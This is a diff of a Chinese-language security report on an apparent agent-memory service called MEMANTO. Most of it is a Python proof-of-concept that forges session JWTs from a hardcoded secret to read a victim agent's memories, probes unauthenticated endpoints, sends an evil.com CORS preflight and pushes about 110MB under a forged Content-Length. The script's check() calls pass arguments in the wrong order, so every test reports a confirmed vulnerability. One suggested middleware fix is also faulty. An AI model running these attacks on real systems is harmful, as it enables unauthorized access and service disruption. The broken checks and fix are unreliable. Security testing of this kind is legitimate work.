@@ -343,103 +343,190 @@ JWT 解码没有验证以下标准声明：
 
 ## PoC 自动利用脚本
 
-以下是一个完整的 Python 脚本，一键验证所有漏洞：
+以下 Python 脚本自动化验证全部 6 个漏洞。运行前将 `TARGET` 改为实际目标地址。
+
+注意：
+- 漏洞 4（CORS）：脚本自动发送 OPTIONS 预检请求并检测 `Access-Control-Allow-Origin` 头，同时标注"建议手动确认"
+- 漏洞 5（文件上传）：脚本尝试小文件上传和伪造 Content-Length 两种方式检测限制是否有效
+- 漏洞 6（JWT 声明校验）：通过构造缺失 `expires_at`/`iat`/`nbf` 字段的异常 token 验证
 
 ```python
 #!/usr/bin/env python3
 """
-MEMANTO Vulnerability PoC - 一键验证脚本
-目标: http://localhost:8000 (默认)
+MEMANTO Vulnerability PoC — 一键验证全部 6 个漏洞
+目标: http://localhost:8000 (默认, 修改 TARGET 变量)
 """
 
 import jwt
 import requests
 import json
+import io
 from datetime import datetime, timedelta, timezone
 
 TARGET = "http://localhost:8000"
 SECRET_KEY = "memanto-default-secret-change-in-production"
 TARGET_AGENT = "victim-agent"
 
+# ──────────────── 辅助函数 ────────────────
+def check(label, ok, detail=""):
+    icon = "[!] 漏洞确认" if ok else "[-] 正常"
+    print(f"    {icon}: {label}  {detail}")
+
+def conn_err(e):
+    print(f"    [x] 无法连接: {e}")
+
+
+# ──────────────── 开始验证 ────────────────
 print("=" * 60)
 print("MEMANTO 漏洞验证 PoC")
 print("=" * 60)
+print("目标:", TARGET)
 print()
 
-# === 漏洞1: JWT 密钥伪造 ===
-print("[!] 漏洞1: 硬编码 JWT 密钥 (CRITICAL)")
+# ── 漏洞 1/6: 硬编码 JWT 密钥 (CRITICAL) ──
+print("[!] 漏洞 1/6: 硬编码 JWT 密钥 (CRITICAL)")
 now = datetime.now(timezone.utc)
-payload = {
+forged_token = jwt.encode({
     "agent_id": TARGET_AGENT,
     "namespace": f"memanto_agent_{TARGET_AGENT}",
     "session_id": "sess_poc_1337",
     "started_at": now.isoformat(),
     "expires_at": (now + timedelta(hours=24)).isoformat()
-}
-forged_token = jwt.encode(payload, SECRET_KEY, algorithm="HS256")
-print(f"    伪造 JWT: {forged_token[:80]}...")
-headers = {"X-Session-Token": forged_token}
-
+}, SECRET_KEY, algorithm="HS256")
+print(f"    从公开密钥伪造 JWT: {forged_token[:80]}...")
 try:
     resp = requests.post(
         f"{TARGET}/api/v2/agents/{TARGET_AGENT}/recall",
         json={"query": "test", "limit": 5},
-        headers=headers,
+        headers={"X-Session-Token": forged_token},
         timeout=5
     )
-    print(f"    API 响应状态码: {resp.status_code}")
-    if resp.status_code == 200:
-        print(f"    [!] 漏洞确认! 可以未授权访问 agent 记忆!")
-        print(f"    响应: {resp.text[:200]}")
-    elif resp.status_code == 404:
-        print(f"    Agent 不存在 (预期行为)")
-    else:
-        print(f"    响应: {resp.text[:200]}")
-except requests.exceptions.ConnectionError:
-    print(f"    [x] 无法连接到 {TARGET}")
+    check(resp.status_code == 200,
+          f"HTTP {resp.status_code} — 可伪造 JWT 访问 agent 记忆")
+except requests.exceptions.ConnectionError as e:
+    conn_err(e)
 print()
 
-# === 漏洞3: /api/v2/status 未授权信息泄露 ===
-print("[!] 漏洞3: /api/v2/status 信息泄露 (MEDIUM)")
-try:
-    resp = requests.get(f"{TARGET}/api/v2/status", timeout=5)
-    print(f"    状态码: {resp.status_code}")
-    if resp.status_code == 200:
-        data = resp.json()
-        print(f"    泄露的 agent_id: {data.get('agent_id')}")
-        print(f"    泄露的 namespace: {data.get('namespace')}")
-        print(f"    泄露的 session_id: {data.get('session_id')}")
-        print(f"    [!] 漏洞确认! 敏感信息泄露!")
-except requests.exceptions.ConnectionError:
-    print(f"    [x] 无法连接到 {TARGET}")
-print()
-
-# === 漏洞2: Web UI API 未授权 ===
-print("[!] 漏洞2: Web UI API 未授权 (HIGH)")
+# ── 漏洞 2/6: Web UI API 未授权 (HIGH) ──
+print("[!] 漏洞 2/6: Web UI API 未授权 (HIGH)")
 try:
     resp = requests.get(f"{TARGET}/api/ui/config", timeout=5)
     print(f"    /api/ui/config 状态码: {resp.status_code}")
     if resp.status_code == 200:
         data = resp.json()
-        print(f"    泄露的 API key 预览: {data.get('api_key_preview')}")
-        print(f"    泄露的活动 agent: {data.get('active_agent_id')}")
-        print(f"    泄露的 session token: {data.get('session_token')}")
-        print(f"    [!] 漏洞确认! Web UI API 完全未授权!")
-except requests.exceptions.ConnectionError:
-    print(f"    [x] 无法连接到 {TARGET}")
+        print(f"    泄露字段: {list(data.keys())[:5]}")
+    check(resp.status_code == 200, "Web UI 配置无需认证即可访问")
+except requests.exceptions.ConnectionError as e:
+    conn_err(e)
+print()
+
+# ── 漏洞 3/6: /api/v2/status 信息泄露 (MEDIUM) ──
+print("[!] 漏洞 3/6: /api/v2/status 信息泄露 (MEDIUM)")
+try:
+    resp = requests.get(f"{TARGET}/api/v2/status", timeout=5)
+    if resp.status_code == 200:
+        data = resp.json()
+        for key in ["agent_id", "namespace", "session_id"]:
+            print(f"    泄露的 {key}: {data.get(key)}")
+    check(resp.status_code == 200, "status 端点无须认证")
+except requests.exceptions.ConnectionError as e:
+    conn_err(e)
+print()
+
+# ── 漏洞 4/6: CORS 配置不当 (MEDIUM) ──
+print("[!] 漏洞 4/6: CORS 配置不当 (MEDIUM) [自动扫描 + 手动确认]")
+print("    手动确认命令:")
+print(f"    curl -s -D- -o/dev/null -X OPTIONS {TARGET}/api/v2/agents/recall \\")
+print("     -H 'Origin: https://evil.com' -H 'Access-Control-Request-Method: POST' \\")
+print("     | grep -i 'access-control'")
+print("    ---")
+print("    脚本自动检测:")
+try:
+    resp = requests.options(
+        f"{TARGET}/api/v2/agents/recall",
+        headers={"Origin": "https://evil.com",
+                 "Access-Control-Request-Method": "POST"},
+        timeout=5
+    )
+    acao = resp.headers.get("Access-Control-Allow-Origin", "(missing)")
+    acac = resp.headers.get("Access-Control-Allow-Credentials", "(missing)")
+    print(f"    Access-Control-Allow-Origin: {acao}")
+    print(f"    Access-Control-Allow-Credentials: {acac}")
+    check(acao == "*" and acac == "true",
+          f"ACAO={acao}, ACAC={acac}")
+except requests.exceptions.ConnectionError as e:
+    conn_err(e)
+print()
+
+# ── 漏洞 5/6: 文件上传无大小限制 (MEDIUM) ──
+print("[!] 漏洞 5/6: 文件上传无大小限制 (MEDIUM) [需上传端点可用]")
+print("    手动验证:")
+print(f"    dd if=/dev/zero of=/tmp/large.bin bs=1M count=150")
+print(f"    curl -X POST -F 'file=@/tmp/large.bin' {TARGET}/api/v2/upload")
+print("    若返回 200 而非 413，则漏洞确认。")
+print("    ---")
+print("    脚本自动检测 (小文件 + 伪造 Content-Length):")
+try:
+    small = io.BytesIO(b"A" * 1024)
+    resp = requests.post(
+        f"{TARGET}/api/v2/upload",
+        files={"file": ("test.txt", small)}, timeout=5
+    )
+    print(f"    小文件上传状态码: {resp.status_code}")
+    # 伪造 Content-Length 测试: 声明 10 字节但发送 100MB+
+    chunk = b"X" * (10 * 1024 * 1024)
+    headers_fake = {"Content-Type": "application/octet-stream",
+                    "Content-Length": "10"}
+    resp2 = requests.post(
+        f"{TARGET}/api/v2/upload",
+        data=chunk * 11,  # ~110MB
+        headers=headers_fake,
+        timeout=3
+    )
+    check(resp2.status_code != 413,
+          f"虚假 Content-Length(10) 发送 110MB: HTTP {resp2.status_code}")
+    print("    注意: 若收到 200 则漏洞确认 — 仅靠 Content-Length 做限制")
+except Exception as e:
+    conn_err(e)
+print()
+
+# ── 漏洞 6/6: JWT 声明校验缺失 (LOW) ──
+print("[!] 漏洞 6/6: JWT 声明校验缺失 (LOW)")
+odd_token = jwt.encode({
+    "agent_id": TARGET_AGENT,
+    "namespace": f"memanto_agent_{TARGET_AGENT}",
+    "session_id": "sess_no_claims_999",
+    # 故意不传 expires_at / iat / nbf — 正常应拒绝
+}, SECRET_KEY, algorithm="HS256")
+print(f"    构造缺失声明的 token: {odd_token[:80]}...")
+try:
+    resp = requests.post(
+        f"{TARGET}/api/v2/agents/{TARGET_AGENT}/recall",
+        json={"query": "never-expires"},
+        headers={"X-Session-Token": odd_token},
+        timeout=5
+    )
+    print(f"    缺失声明的 token 请求: HTTP {resp.status_code}")
+    check(resp.status_code == 200,
+          "token 缺失 expires_at/iat/nbf 仍被接受 — 缺少声明校验")
+except requests.exceptions.ConnectionError as e:
+    conn_err(e)
 print()
 
 print("=" * 60)
 print("PoC 验证完成")
 print("=" * 60)
 print()
-print("发现的漏洞汇总:")
+print("漏洞汇总:")
 print("  1. [CRITICAL] 硬编码 JWT 密钥 -> 完全认证绕过")
 print("  2. [HIGH]     Web UI API 未授权访问")
 print("  3. [MEDIUM]   /api/v2/status 信息泄露")
-print("  4. [MEDIUM]   CORS 配置不当")
-print("  5. [MEDIUM]   文件上传无大小限制")
-print("  6. [LOW]      JWT 验证缺乏声明校验")
+print("  4. [MEDIUM]   CORS 配置不当 (自动扫描 + 手动确认)")
+print("  5. [MEDIUM]   文件上传无大小限制 (自动检测 + 手动确认)")
+print("  6. [LOW]      JWT 声明校验缺失 (自动检测)")
+print()
+print("说明: 漏洞 4/5 的自动检测受限于目标端点可用性；")
+print("      建议配合手动命令验证。")
 ```
 
 ---
@@ -473,12 +560,57 @@ if not resolved_secret_key or resolved_secret_key == "memanto-default-secret-cha
 2. 默认使用空列表，需要用户显式配置可信来源
 
 ### 漏洞五：文件上传限制
+**⚠️ 修复要点：不要仅信任 Content-Length 头**
+
+当前建议仅检查 `Content-Length` 请求头，这可以被攻击者伪造。推荐改用**流式读取 + 字节计数器**或框架级中间件：
+
+**方案 A：FastAPI UploadFile 字节计数器（推荐）**
 ```python
+from fastapi import UploadFile, HTTPException
+
 MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB
-content_length = request.headers.get("content-length", 0)
-if int(content_length) > MAX_FILE_SIZE:
-    raise HTTPException(status_code=413, detail="File too large")
+
+async def validate_upload_size(file: UploadFile) -> bytes:
+    bytes_read = 0
+    chunks = []
+    while True:
+        chunk = await file.read(8192)  # 8KB 流式读取
+        if not chunk:
+            break
+        bytes_read += len(chunk)
+        if bytes_read > MAX_FILE_SIZE:
+            raise HTTPException(status_code=413, detail="File too large")
+        chunks.append(chunk)
+    return b"".join(chunks)
+
+# 使用方式
+file_bytes = await validate_upload_size(file)
 ```
+
+**方案 B：Starlette 请求体大小中间件**
+```python
+from starlette.middleware.base import BaseHTTPMiddleware
+
+class MaxBodySizeMiddleware(BaseHTTPMiddleware):
+    def __init__(self, app, max_size: int = 100 * 1024 * 1024):
+        super().__init__(app)
+        self.max_size = max_size
+
+    async def dispatch(self, request, call_next):
+        content_length = request.headers.get("content-length")
+        if content_length and int(content_length) > self.max_size:
+            raise HTTPException(status_code=413, detail="File too large")
+        # 额外检查实际发送内容（处理伪造 Content-Length）
+        if request.method in ("POST", "PUT", "PATCH"):
+            actual = 0
+            async for chunk in request.stream():
+                actual += len(chunk)
+                if actual > self.max_size:
+                    raise HTTPException(status_code=413, detail="File too large")
+        return await call_next(request)
+```
+
+**方案 C：使用 FastAPI 内置中间件**（如 `max_request_size`）
 
 ### 漏洞六：JWT 验证
 ```python
